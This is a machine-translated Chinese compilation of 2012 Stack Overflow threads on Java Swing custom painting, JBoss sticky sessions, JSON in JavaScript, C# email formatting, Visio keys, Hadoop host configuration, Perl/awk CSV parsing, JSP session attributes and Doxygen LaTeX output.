*   就像@HovercraftFullOfEels 提到的那样，您直接调用您的图形，这是永远不应该做的。

*   其次，查看您的`GameFrame()`构造函数，将其设置为可见，甚至在您向其中添加任何组件之前以及在它的实际大小确定之前很久

编码中的此类漏洞可能会引起很多麻烦，因为当您坐下来编写大型程序时，最好从一开始就走在安全的道路上，然后在后期诅咒自己。正如他们所说，**预防胜于治疗。**

现在来到你的程序，你错过了主要的事情，因为你没有指定你的`CustomComponent`ie的大小`JComponent`，因此你无法在屏幕上看到它。当你将 a 扩展`JCompoent`到你的类时，让它成为一个习惯性的习惯来覆盖它的[getPreferredSize()](http://docs.oracle.com/javase/7/docs/api/javax/swing/JComponent.html#getPreferredSize())，就像你覆盖它的`paintComponent(...)`方法一样。

看看这个我为你精心制作的小程序，或许能帮到你，让你更明白其中的逻辑。

```
import java.awt.*;
import java.awt.event.*;
import java.awt.geom.RoundRectangle2D;
import javax.swing.*;

public class CustomPainting {

    private RectangleComponent life;
    private RectangleComponent death;

    private void createAndDisplayGUI() {
        JFrame frame = new JFrame("Custom Painting");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

        JPanel centerPanel = new JPanel();
        centerPanel.setLayout(new GridLayout(0, 2, 5, 5));
        // Specifying the WIDTH, HEIGHT and Colour for this JComponent.
        life = new RectangleComponent(Color.GREEN.darker(), 20, 20);
        death = new RectangleComponent(Color.RED.darker(), 20, 20);
        centerPanel.add(life);
        centerPanel.add(death);

        JPanel buttonPanel = new JPanel();
        buttonPanel.setLayout(new FlowLayout(FlowLayout.LEFT, 5, 5));
        JButton incLifeButton = new JButton("INCREASE LIFE");
        incLifeButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                life.addLife(1);
            }
        });

        JButton decLifeButton = new JButton("DECREASE LIFE");
        decLifeButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                life.subtractLife(1);
            }
        });

        JButton incDeathButton = new JButton("INCREASE DEATH");
        incDeathButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                death.addLife(1);
            }
        });

        JButton decDeathButton = new JButton("DECREASE DEATH");
        decDeathButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                death.subtractLife(1);
            }
        }); 

        buttonPanel.add(incLifeButton);
        buttonPanel.add(decLifeButton);
        buttonPanel.add(incDeathButton);
        buttonPanel.add(decDeathButton);

        frame.getContentPane().add(centerPanel, BorderLayout.CENTER);
        frame.getContentPane().add(buttonPanel, BorderLayout.PAGE_END);
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    public static void main(String\u005B\u005D args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new CustomPainting().createAndDisplayGUI();
            }
        });
    }
}

class RectangleComponent extends JComponent {

    private Color colour;
    private static final int MARGIN = 10;
    private int width;
    private int height;
    private int originalWidth;
    private RoundRectangle2D roundedRectangle;

    public RectangleComponent(Color c, int w, int h) {
        colour = c;
        width = w;
        height = h;
        originalWidth = width;
    }

    /*
     * Overriding this method, so that
     * the size of the JComponent
     * can be determined, on the screen
     * or by the LayoutManager concern.
     */
    @Override 
    public Dimension getPreferredSize() {
        return (new Dimension(width, height));
    }

    @Override
    protected void paintComponent(Graphics g) {
        super.paintComponent(g);
        Graphics2D g2d = (Graphics2D) g;
        roundedRectangle = new RoundRectangle2D.Float(MARGIN, MARGIN,
                                        width, height, MARGIN, MARGIN);
        g2d.setPaint(colour);
        g2d.draw(roundedRectangle);
        g2d.fill(roundedRectangle);
    }

    public void subtractLife(int amount) {
        width -= amount;
        System.out.println("ORIGINAL Width : " + originalWidth);
        System.out.println("Width : " + width);
        if (width > 0) {
            roundedRectangle.setRoundRect(MARGIN, MARGIN, width, height,
                                            MARGIN, MARGIN);
            /*
             * This repaint() will call the paintComponent(...)
             * by itself, so nothing else to be done.
             */
            repaint();
        } else {
            width += amount;
        }
    }

    public void addLife(int amount) {
        width += amount;
        System.out.println("ORIGINAL Width : " + originalWidth);
        System.out.println("Width : " + width);
        if (width < originalWidth) {
            roundedRectangle.setRoundRect(MARGIN, MARGIN, width, height,
                                            MARGIN, MARGIN);
            repaint();
        } else {
            width -= amount;
        }
    }
} 
```

一定要问任何问题，这可能会在你完成这个程序时出现:-)，我很乐意帮助你:-)

**两种颜色的最新编辑：**

```
import java.awt.*;
import java.awt.event.*;
import java.awt.geom.RoundRectangle2D;
import javax.swing.*;

public class CustomPainting {

    private RectangleComponent lifeDeath;

    private void createAndDisplayGUI() {
        JFrame frame = new JFrame("Custom Painting");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

        JPanel centerPanel = new JPanel();
        centerPanel.setLayout(new GridLayout(0, 2, 5, 5));
        // Specifying the WIDTH, HEIGHT and Colour for this JComponent.
        lifeDeath = new RectangleComponent(Color.GREEN, Color.RED, 20, 20);
        centerPanel.add(lifeDeath);

        JPanel buttonPanel = new JPanel();
        buttonPanel.setLayout(new GridLayout(1, 2, 5, 5));
        JButton incLifeButton = new JButton("INCREASE LIFE");
        incLifeButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                lifeDeath.addLife(1);
            }
        });

        JButton decLifeButton = new JButton("DECREASE LIFE");
        decLifeButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent ae) {
                lifeDeath.subtractLife(1);
            }
        });

        buttonPanel.add(incLifeButton);
        buttonPanel.add(decLifeButton);

        frame.getContentPane().add(centerPanel, BorderLayout.CENTER);
        frame.getContentPane().add(buttonPanel, BorderLayout.PAGE_END);
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    public static void main(String\u005B\u005D args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new CustomPainting().createAndDisplayGUI();
            }
        });
    }
}

class RectangleComponent extends JComponent {

    private Color lifeColour;
    private Color deathColour;
    private static final int MARGIN = 10;
    private int widthLife;
    private int widthDeath;
    private int height;
    private int originalWidth;
    private RoundRectangle2D roundedRectangle;

    public RectangleComponent(Color lc, Color dc, int w, int h) {
        lifeColour = lc;
        deathColour = dc;
        widthLife = w;
        height = h;
        originalWidth = widthLife;
        widthDeath = 0;     
    }

    /*
     * Overriding this method, so that
     * the size of the JComponent
     * can be determined, on the screen
     * or by the LayoutManager concern.
     */
    @Override 
    public Dimension getPreferredSize() {
        return (new Dimension(originalWidth, height));
    }

    @Override
    protected void paintComponent(Graphics g) {
        super.paintComponent(g);
        Graphics2D g2d = (Graphics2D) g;

        roundedRectangle = new RoundRectangle2D.Float((MARGIN + widthDeath), MARGIN,
                                        widthLife, height, MARGIN, MARGIN);
        g2d.setPaint(lifeColour);
        g2d.draw(roundedRectangle);
        g2d.fill(roundedRectangle);

        roundedRectangle.setRoundRect(MARGIN, MARGIN,
                                        widthDeath, height, MARGIN, MARGIN);
        g2d.setPaint(deathColour);
        g2d.draw(roundedRectangle);
        g2d.fill(roundedRectangle);
    }

    public void subtractLife(int amount) {
        widthLife -= amount;
        widthDeath += amount;
        System.out.println("ORIGINAL Width : " + originalWidth);
        System.out.println("Width Life : " + widthLife);
        System.out.println("Width Death : " + widthDeath);
        if (widthLife > 0 && widthDeath < originalWidth) {
            /*
             * This repaint() will call the paintComponent(...)
             * by itself, so nothing else to be done.
             */
            repaint();
        } else {
            widthLife += amount;
            widthDeath -= amount;
        }
    }

    public void addLife(int amount) {
        widthLife += amount;
        widthDeath -= amount;
        System.out.println("ORIGINAL Width : " + originalWidth);
        System.out.println("Width Life : " + widthLife);
        System.out.println("Width Death : " + widthDeath);
        if (widthLife < originalWidth && widthDeath > 0) {
            repaint();
        } else {
            widthLife -= amount;
            widthDeath += amount;
        }   
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T02:52:52.940

不需要传递给刚刚get`JPanel`的构造函数，也不需要手动调用。请参阅[AWT 和 Swing 中的绘画](http://java.sun.com/products/jfc/tsc/articles/painting/index.html)。查看这个[示例](https://stackoverflow.com/a/7724971/1048330)，该示例演示了一个绘制矩形的自定义组件。`RectangleComponent``Graphics``paintComponent`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-20T03:18:00.703

你的代码有点创意，有点疯狂，而且逻辑很难理解。最不寻常的方面是它有两个 JFrame，一个称为“帧”，一个是 GameFrame 对象本身，两者都添加了组件，但只有一个显示。您还有许多返回 void 的方法（如果过度使用会增加代码异味），只会使代码更加混乱。

例如，

```
public GameFrame(char x) {

  // here you set up the "frame" JFrame
  frame.setSize(1024, 768);
  frame.setTitle("Game");
  frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
  frame.setVisible(true);
  FlowLayout layout = new FlowLayout();
  createPanels(x);
  healthPanel.setLayout(layout);
  buttonPanel.setLayout(layout);
  mainPanel.setLayout(layout);

  // here you add content to the frame JFrame, and pack it
  frame.getContentPane().add(mainPanel);
  frame.pack();
  repaint();  // and then call repaint on the "this" JFrame?
}

public RectangleComponent getLife() {
  return life;
}

private void createHealth() {
  life = new RectangleComponent(green, healthPanel);
  death = new RectangleComponent(red, healthPanel);
}

private void createPanels(char x) {
  add(healthPanel); // now you add content to the "this" JFrame
  pack();  // and pack it
  createBar(x);
  createHealth();
  mainPanel.add(buttonPanel);
  mainPanel.add(healthPanel); // and then re-add a JPanel into a second JPanel?
  healthPanel.add(death);
  healthPanel.add(life);
  buttonPanel.add(bar.getSpell1());
  buttonPanel.add(bar.getSpell2());
  buttonPanel.add(bar.getSpell3());
  add(mainPanel); // and then re -add the mainPanel into the "this" JFrame???
} 
```

这一切都非常令人困惑，而且不太可能奏效。

然后是您尝试直接调用paintComponent 并在JComponent 上调用getGraphics，这两者都不应该完成。您将需要阅读图形教程以了解如何正确执行此操作。

我建议您考虑重新编写此代码，并且首先只使用一个 JFrame，并更好地组织您的代码。

# servlets - 在负载均衡器后面点击特定的 jboss 实例

> ID：10239433
> 
> 赞同：0
> 
> 时间：2012-04-20T02:28:09.187
> 
> 标签：servlets, jboss

我的 webapp 部署在多个 JBoss 实例的集群中。webapp 中有一个管理页面来执行某些特定于 Jboss 实例的操作。

问题是请求被发送到负载均衡器，而不是直接命中特定的单个实例。

有没有办法将请求定向到特定实例？或者至少当管理页面启动时，所有后续请求（Ajax）都将坚持最初为该页面提供服务的原始实例。

我不认为 HttpSession 在这里会有所帮助。我需要针对特定​​实例而不是维护单个客户端的状态。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T06:36:27.547

您正在寻找如何配置 Sticky 会话。

将用户会话中的所有请求一致地发送到同一后端服务器，称为持久性或粘性。这种技术的一个显着缺点是它缺乏自动故障转移：如果后端服务器出现故障，它的每个会话信息将变得无法访问，并且依赖于它的任何会话都将丢失。同样的问题通常与中央数据库服务器有关。即使 Web 服务器是“无状态的”而不是“粘性的”。

对特定服务器的分配可能基于用户名、客户端 IP 地址或随机分配。虽然这些方法各有利弊。

我建议请阅读下面在集群下配置 JBoss 的文章，而不是深入了解，除非您想深入了解。

[http://docs.jboss.org/jbossas/docs/Clustering_Guide/beta422/html/clustering-http-nodes.html](http://docs.jboss.org/jbossas/docs/Clustering_Guide/beta422/html/clustering-http-nodes.html)

[https://community.jboss.org/wiki/HTTPLoadbalancer](https://community.jboss.org/wiki/HTTPLoadbalancer)

# javascript - 如何在 javascript 中创建 JSON 对象

> ID：10239434
> 
> 赞同：0
> 
> 时间：2012-04-20T02:28:11.300
> 
> 标签：javascript, data-structures

我遇到了我应该传递给服务器的数据的 JSON 结构问题。以下是所需的格式。

```
 var data = '{"listingHotspots": [{"PropertyGuid": "5dc934f6-cb5a-44d4-95e6-cf7d5712359e","Hotspot": {"Coordinates": "581,391,676,391,677,410,714,410,715,562,599,562,598,527,597,473,597,409,580,407,581,391"}}]}' 
```

我的代码是

```
 var data = {'listingHotspots':[]};
    data['listingHotspots'].push({'PropertyGuid':savedGuid,'Hotspot':    {'Coordinates':coord_string}}); 
```

这是创建一个有效的 JavaScript 对象，但不是我需要的。我也使用了 JSON.stringify() 但它导致了一个未定义的值。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T04:10:34.823

JSON.stringify() 可能不在目标浏览器中。如果是这种情况，您需要加载 json2.js。json2.js 不会破坏本机 JSON.stringify() 如果它存在，所以除了额外的请求之外，一直加载它是没有害处的。见[http://www.json.org/js.html](http://www.json.org/js.html)和[http://www.cdnjs.com/#/search/json2](http://www.cdnjs.com/#/search/json2)和[http://modernizr.com/docs/#load](http://modernizr.com/docs/#load)

# c# - 通过电子邮件并排发送两个列表？

> ID：10239437
> 
> 赞同：0
> 
> 时间：2012-04-20T02:28:31.720
> 
> 标签：c#, winforms

我这里有个小问题。我有一个应用程序，它通过电子邮件发送文件名列表，通知用户这些文件已超过一定的大小限制。但现在我希望它不仅发送文件名，而且发送文件大小。我设法将文件大小附加到电子邮件中。但我的问题是它的显示方式。我希望它显示如下：

```
THE FILES :

filename1 = filesize1
filename2 = filesize2
filename3 = filesize3
..
..
..

HAS REACHED ITS LIMITS! 
```

但是我当前在电子邮件中的显示格式如下：

```
THE FILES :

filename1
filename2
filename3
filesize1
filesize2
filesize3

HAS REACHED ITS LIMITS! 
```

现在我不知道如何像第一个那样更改显示格式。任何帮助将不胜感激。这是我的代码片段：

```
private void Form1_Load(object sender, EventArgs e)
    {   
        count = 0;
        timer = new Timer();
        timer.Interval = 1000;
        timer.Tick += new EventHandler(timer1_Tick);
        timer.Start();
        System.Collections.Generic.List<string> files = new List<string>();
        System.Collections.Generic.List<string> files1 = new List<string>();
        //List<string> s1 = System.IO.Directory.GetFiles(@"C:\Documents and Settings\Administrator\Desktop\test", "*.*", SearchOption.AllDirectories).ToList<string>();
        List<string> s1 = System.IO.Directory.GetFiles(@"F:\gdimaging\data", "*.*", SearchOption.AllDirectories).ToList<string>();
        s1.AddRange(System.IO.Directory.GetFiles(@"F:\hios\DATA", "*.*", SearchOption.AllDirectories).ToList<string>());
        s1.AddRange(System.IO.Directory.GetFiles(@"F:\imgviewer\data", "*.*", SearchOption.AllDirectories).ToList<string>());
        s1.AddRange(System.IO.Directory.GetFiles(@"F:\newcnas\data", "*.*", SearchOption.AllDirectories).ToList<string>());
        s1.AddRange(System.IO.Directory.GetFiles(@"F:\newpod\data", "*.*", SearchOption.AllDirectories).ToList<string>());
        s1.AddRange(System.IO.Directory.GetFiles(@"F:\OMS\data", "*.*", SearchOption.AllDirectories).ToList<string>());
        s1.AddRange(System.IO.Directory.GetFiles(@"F:\WEBIMG", "*.*", SearchOption.AllDirectories).ToList<string>());

        dt.Columns.Add("File_Name");
        dt.Columns.Add("File_Type");
        dt.Columns.Add("File_Size");
        dt.Columns.Add("Create_Date");

        foreach (string s in s1) 
        {   
            try
            {   
                FileInfo info = new FileInfo(s);
                FileSystemInfo sysInfo = new FileInfo(s);
                dr = dt.NewRow();
                dr["File_Name"] = sysInfo.Name;
                dr["File_Type"] = sysInfo.Extension;
                dr["File_Size"] = (info.Length / 1024).ToString();
                dr["Create_Date"] = sysInfo.CreationTime.Date.ToString("dd/MM/yyyy");
                dt.Rows.Add(dr);

                if ((info.Length / 1024) > 1500000)
                {
                    MyFiles = new Dictionary<string, string>();
                    //files.Add(sysInfo.Name.ToString());
                    //files1.Add(info.Length.ToString());
                    //arr = string.Join("<br/>", files.ToArray());
                    //arr1 = string.Join("<br/>", files1.ToArray());
                    MyFiles.Add(sysInfo.Name.ToString(), info.Length.ToString());
                }

                if (dt.Rows.Count > 0)
                {
                    dataGridView1.DataSource = dt;
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                MessageBox.Show("Error : " + ex.Message);
                continue;
            }
        }

        if (arr != null)
        {
            ///Basic Email message
            MailMessage mailMessage = new MailMessage();
            // Email to send to
            mailMessage.To.Add(new MailAddress("shahrul1509@yahoo.com"));
            mailMessage.To.Add(new MailAddress("shahrul_kakashi90@hotmail.com"));
            //set subject
            mailMessage.Subject = "FILE SIZE WARNING MESSAGE";
            //set body
            //mailMessage.Body = "THE FILES : <br/><br/>" + arr + arr1 + "<br/><br/> HAS REACH ITS SIZE LIMIT!!";
            mailMessage.Body = "THE FILES : <br/><br/>";
            foreach (string key in MyFiles.Keys)
            {
                mailMessage.Body += key + " = " + MyFiles[key] + "<br/>";
                mailMessage.Body += "<br/> HAS REACHED ITS SIZE LIMIT!";
            }
            mailMessage.IsBodyHtml = true;
            mailMessage.From = new MailAddress("************", "Shahrul Nizam");
            //Identify the credentials to login to the gmail account
            string sendEmailsFrom = "**********";
            string sendEmailsFromPassword = "**********";
            NetworkCredential cred = new NetworkCredential(sendEmailsFrom, sendEmailsFromPassword);
            SmtpClient mailClient = new SmtpClient("smtp.gmail.com", 587);
            mailClient.EnableSsl = true;
            mailClient.DeliveryMethod = SmtpDeliveryMethod.Network;
            mailClient.UseDefaultCredentials = false;
            //mailClient.Timeout = 20000;
            mailClient.UseDefaultCredentials = true;
            mailClient.Credentials = cred;
            mailClient.Send(mailMessage);
            //MessageBox.Show("Email Notification Sent!");
            //MessageBox.Show(fileList.ToString() + "overlimit!!");
        }
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
            count++;
            if (count == 600)
            {
                count = 0;
                timer.Stop();
                Application.Restart();
            }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:36:19.523

改变这个：

```
/*step 1*/if ((info.Length / 1024) > 1500000)
                {//my size checking and storing it in an array
                    files.Add(sysInfo.Name.ToString());
                    files1.Add(info.Length.ToString());
                    arr = string.Join("<br/>", files.ToArray());
                    arr1 = string.Join("<br/>", files1.ToArray());
                }
/*step 2*/mailMessage.Body = "THE FILES : <br/><br/>" + arr + arr1 + "<br/><br/> HAS REACH ITS SIZE LIMIT!!"; 
```

到

```
/*step 1*/if ((info.Length / 1024) > 1500000)
                {//my size checking and storing it in an array
                    files.Add(sysInfo.Name.ToString());
                    files1.Add(info.Length.ToString());
                }
/*step2*/mailMessage.Body = "THE FILES : <br/><br/>";
for(int i=0; i<files.Count; i++)
  mailMessage.Body += files[i] + " = " + files1[i] + "<br/>;
mailMessage.Body += "<br/> HAS REACHED ITS SIZE LIMIT!!"; 
```

列表最后一个实例的额外`<br/>`内容无关紧要，因为最后一行以 2 个中断开头（我删除了一个）。

我提出的假设：

*   列表大小相同
*   一个中的每个索引对应于另一个中的项目。

使用 DICTIONARY （类型为 ）可以做得更好，如下所示：

```
/*step 1*/if ((info.Length / 1024) > 1500000)
                {//my size checking and storing it in an array
                    /* I suppose there is a Dictionary<string, string> MyFiles;
                    MyFiles = new Dictionary<string,string>(); instantiated like so*/
                    MyFiles.add(sysInfo.Name.ToString(), info.Length.ToString());
                }
                //attaching the array to the email body
                    /*step 2*/mailMessage.Body = "THE FILES : <br/><br/>";
                    foreach(string key in MyFiles.Keys)
                      mailMessage.Body += key + " = " + MyFiles[key] + "<br/>";
                    mailMessage.Body += "<br/> HAVE REACHED THEIR SIZE LIMIT!!"; 
```

请注意，我所说的更好*并不是*指内存效率更高。更好是指不易出错。从技术上讲，您有一个键值对。那是一本字典。

# sql - Visio 数据库设计 - 不确定 Visio 添加的其他外键

> ID：10239440
> 
> 赞同：1
> 
> 时间：2012-04-20T02:28:43.990
> 
> 标签：sql, database-design, database-schema

请参阅我为帮助可视化我的问题而制作的以下示例数据库模型：

![在此处输入图像描述](../Images/f21f87fd43407f0ed9518ecee4d20c01.png)

在这个例子中， 之间的关系`car and history is 1 to zero or more`和 之间的关系`car and options is 1 to zero or more`。

两个表都 `car car_id`作为外键，但 Visio 还希望`customer` 每个表的主键作为外键，如上图所示。我不确定这是否必要/正确。如果我删除添加的外键，visio 会将关系标记为不可识别（虚线），所以我觉得好像我做错了什么

谁能告诉我为什么 Visio 将添加`customer cust_id`到子表`car`？在这种情况下，手动删除外键是否是个坏主意？

## 根据评论（和选择的答案）更新图表

![在此处输入图像描述](../Images/87c4f3a5f3cecb46ffe7504f9b9c8df4.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T14:41:44.733

非识别关系本身没有任何“错误”。

是`car_id`独一无二**的**，还是在上下文中`cust_id`（所以我们可以`car_id`对不同`cust_id`的 s 有相同的）？

*   如果它本身是唯一的，则`customer`-`car`关系应该是不可识别的。
*   否则它应该被识别。这样做的一个自然结果是传播`cust_id`到所有“下游”实体。

顺便说一句，同样的问题可能会被问到`opt_id`-`hist_id`它们本身是独一无二的还是在`car`PK 的背景下是独一无二的？答案决定了关系是否应该被识别`car`。`options``car``history`

# hadoop - Hadoop 网页，“SlaveNodeName:50060/tasktracker.jsp”无法访问

> ID：10239444
> 
> 赞同：0
> 
> 时间：2012-04-20T02:29:55.057
> 
> 标签：hadoop

最近我用三台计算机配置了一个hadoop平台：一台用于namenode/jobtracker。另外两个是给tasktracker的，计算机名是gp和ls-ubuntu。但问题是当我想从网页搜索 gp 节点时，我被拒绝了。发生了什么？

在 gp 节点上，/etc/hosts 如下： 192.168.0.102 gp # 由 NetworkManager 添加

127.0.0.1 localhost.localdomain 本地主机

::1 gp localhost6.localdomain6 localhost6

192.168.0.89 节点1

192.168.0.77 节点2

192.168.0.102 节点3

127.0.1.1 金币

node1 是我的jobtracker，node2 和node3 是tasktracker。

gp 的 url 无法访问： [http://gp:50075/browseDirectory.jsp--------------](http://gp:50075/browseDirectory.jsp--------------wrong) 当我将 gp 修改为 node3 时出错，看起来是对的。但是我不能通过点击链接进入datanode页面。</p>

我已经使用 ssh 连接所有节点。

我应该怎么办？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T07:18:00.407

删除该 127.0.1.1 gp 并将其设置为 127.0.0.1 并按如下方式进行主机条目并尝试：

```
127.0.0.1 localhost.localdomain localhost gp

::1 gp localhost6.localdomain6 localhost6

192.168.0.89 node1

192.168.0.77 node2

192.168.0.102 node3 
```

它会起作用的。因为 127.0.1.1 总是会产生问题，我不知道原因，否则我会告诉你的 :)

# perl - 如何从 CSV 文件的不同列中分离出与字母相对应的单词？

> ID：10239448
> 
> 赞同：-1
> 
> 时间：2012-04-20T02:30:12.033
> 
> 标签：perl, bash, sed

我有一个 CSV 文件，如下所示：

```
ACDB,this is a sentence
BECD,this is another sentence
BCAB,this is yet another 
```

第一列中的每个字符对应于第二列中的一个词，例如，在第一列中，`A`对应于“this”，对应于`C`“is”，对应`D`于“a”，以及`B`，对应于sentence。

给定变量`character`，它可以设置为第一列中出现的任何字符，我需要隔离与所选字母对应的单词，例如，如果我设置`character="B"`，那么上面的输出将是：

```
sentence
this
this another 
```

如果我设置 `character="C"，那么上面的输出将是：

```
is
another
is 
```

如何仅输出与所选字母位置相对应的单词？

*   该文件包含许多 UTF-8 字符。
*   对于第 1 列中的每个字符，第 2 列中总是有相同数量的单词。
*   第 2 列中的单词用空格分隔。

这是我到目前为止的代码：

```
while read line
do
    characters="$(echo $line | awk -F, '{print $1}')"
    words="$(echo $line | awk -F, '{print $2}')"
    character="B"
done < ./file.csv 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:41:00.513

这是一个基本完成的臀部答案。

由于 SO 不是“为我做我的工作”网站，因此您需要填写一些琐碎的空白。

```
sub get_index_of_char {
   my ($character, $charset) = @_;
   # Homework: read about index() function
   #http://perldoc.perl.org/functions/index.html
}

sub split_line {
    my ($line) = @_;
    # Separate the line into a charset (before comma), 
    # and whitespace separated word list.
    # You can use a regex for that
    my ($charset, @words) = ($line =~ /^([^,]+),(?(\S+)\s+)+(\S+)$/g); # Not tested
    return ($charset, \@words);
}

sub process_line {
    my ($line, $character) = @_;
    chomp($line);
    my ($charset, $words) = split_line($line);
    my $index = get_index_of_char($character, $charset);
    print $words->[$index] . "\n"; # Could contain a off-by-one bug
}

# Here be the main loop calling process_line() for every line from input 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:52:37.077

这似乎可以解决问题。它使用 DATA 文件句柄从源文件中读取数据，而您必须从自己的源中获取数据。您可能还需要注意没有与给定字母对应的单词（如此处第二个数据行中的“A”）。

```
use strict;
use warnings;

my @data;

while (<DATA>) {
  my ($keys, $words) = split /,/;
  my @keys = split //, $keys;
  my @words = split ' ', $words;
  my %index;
  push @{ $index{shift @keys} }, shift @words while @keys;
  push @data, \%index;
}

for my $character (qw/ B C /) {
  print "character = $character\n";
  print join(' ', @{$_->{$character}}), "\n" for @data;
  print "\n";
}

__DATA__
ACDB,this is a sentence
BECD,this is another sentence
BCAB,this is yet another 
```

**输出**

```
character = B
sentence
this
this another

character = C
is
another
is 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T10:52:04.040

这可能对您有用：

```
x=B                                                      # set wanted key variable
sed '
:a;s/^\([^,]\)\(.*,\)\([^ \n]*\) *\(.*\)/\2\4\n\1 \3/;ta # pair keys with values
s/,//                                                    # delete ,
s/\n[^'$x'] [^\n]*//g                                    # delete unwanted keys/values
s/\n.//g                                                 # delete wanted keys
s/ //                                                    # delete first space
/^$/d                                                    # delete empty lines
' file
sentence
this
this another 
```

或在 awk 中：

```
awk -F, -vx=B '{i=split($1,a,"");split($2,b," ");c=s="";for(n=1;n<=i;n++)if(a[n]==x){c=c s b[n];s=" "} if(length(c))print c}' file
sentence
this
this another 
```

# java - 我无法在 Eclipse 中配置 JavaFx SDK 路径

> ID：10239450
> 
> 赞同：0
> 
> 时间：2012-04-20T02:30:28.683
> 
> 标签：java, eclipse, javafx

我无法在其首选项中配置 JavaFX SDK 路径，但我将 lib/desktop jar 拖到我的工作区构建路径中。但是eclipse无法识别`import javafx.application.Application;`。我可以在哪个罐子里找到那个？

这是我的 SDK 路径：`D:\Program Files\JavaFX\javafx-sdk1.3`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T09:43:47.347

您使用的是 JavaFX 的旧 1.x 版本吗？如果没有，则在文件系统中找到**jfxrt.jar文件并将其添加到项目的类路径中。**

# javascript - Javascript - 将变量传递给 session.getAttribute

> ID：10239452
> 
> 赞同：0
> 
> 时间：2012-04-20T02:30:36.930
> 
> 标签：javascript, session, variables

我有一个成功设置了一堆会话变量的 Java servlet，说：

会话变量 1 会话变量 2 会话变量 3

现在，在 Java Script 中，我可以使用类似于以下的代码读取和打印会话变量：

```
var name = '<%= session.getAttribute( "SessionVar1" ) %>';      
var name = '<%= session.getAttribute( "SessionVar2" ) %>';      
var name = '<%= session.getAttribute( "SessionVar3" ) %>'; 
```

然后我调用 document.write 打印 name1、name2 和 name3。

同样，这没有问题。但是，我没有 3 个会话变量，而是 100 个。我不想编写 100 个对 session.getAttribute 的调用，所以我想使用“FOR”循环并将循环计数器附加到要检索的会话变量的名称中。类似于以下内容：

```
int i=100;
for (i=1; i<=100; i++)
{
   var VariableName = "SessionVar" + i;
   var name = '<%= session.getAttribute( VariableName ) %>';      
   document.write(name);
} 
```

我尝试了很多组合，但无法将参数传递给 session.getAttribute。我知道服务器上下文中不存在 Javascript 参数，但我想知道是否有任何方法可以避免调用 session.getAttribute 100 次。

先感谢您。

问候，

盖伊

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:34:06.757

当然不是——scriptlet (boooo) 在客户端有机会运行任何 JavaScript 之前运行。

规范的解决方案是在 Java 中生成 JS（最好使用标签），*非常*粗略：

```
<% for (int i = 0; i < 100; i++) { %>
    var name<%= i %> = '<%= session.getAttribute("SessionVar" + i) %>';
<% } %> 
```

需要注意的是 (a) ew 和 (b) 您应该对属性进行 JavaScript 转义以确保安全。

这仍然调用`getAttribute`了 100 次——你需要 100 个会话变量（已经开始成为代码异味），你调用它 100 次。您的另一个选择是将这一切都放入一个数组中，因为这`nameNNN`也有点奇怪——集合的存在是有原因的。

# latex - 包括 doxygen 的 LaTeX 输出作为更大文档的附录

> ID：10239453
> 
> 赞同：18
> 
> 时间：2012-04-20T02:30:48.333
> 
> 标签：latex, doxygen

我有一本使用 LaTeX 的“项目书” `\documentclass{report}`（“报告”就像一个更紧凑的版本`\documentclass{book}`）。我想在本书中包含一个附录，其中包含 Doxygen 为项目中的软件生成的 API 文档。

我通过设置 Doxygen 的配置选项`LATEX_HEADER`和`LATEX_FOOTER`一个空文件来实现这一点。这使得生成的 latex/refman.tex 具有顶级命令，例如：`\section{\-Namespace \-Index}`，此时我可以将其包装为顶级文档，例如：

```
\documentclass{report}
\usepackage{doxygen.sty}
% the "import" package helps to find Doxygen files in the latex/ subdirectory
\usepackage{import}
% [...] title page and the rest of the book

\appendix
\chapter{API reference (generated by Doxygen)
subimport{latex/}{refman.tex}

% [...] final stuff
\end{document} 
```

这工作得相当好，我得到`doxygen.sty`了这个特殊的 doxygen 调用：

```
doxygen -w latex /dev/null /dev/null doxygen.sty 
```

一个问题是这会在整个文档上放置一个“自动生成的”标题（不仅仅是在 doxygen 附录上）。我可以通过编辑`doxygen.sty`（实际上我也将其重命名以包含在内）并注释掉以 . 开头的块来摆脱它`% Setup fancy headings`。

在这一点上，我有一些可以接受的东西，但我想更进一步：“doxygen”样式修改了 LaTeX 文档样式的许多其他方面，我不太喜欢它。

所以我的问题是（在两个卓越水平上）：

1.  放在 doxygen.sty 文件中的最小 LaTeX 命令集是什么，可以很好地呈现 doxygen 附录但不会干扰 LaTeX 文档的其余部分？

2.  更好的是，有没有人想出一种方法

    ```
    \usepackage{doxygen_standalone}
    % [... until you need doxygen]
    \begin{doxygen}
    % the stuff you need to insert your auto-generated doxygen API docs,
    % for example the \subimport{latex/}{refman.tex} that I showed above
    \end{doxygen} 
    ```

最后一种方法是我认为非常干净的方法。

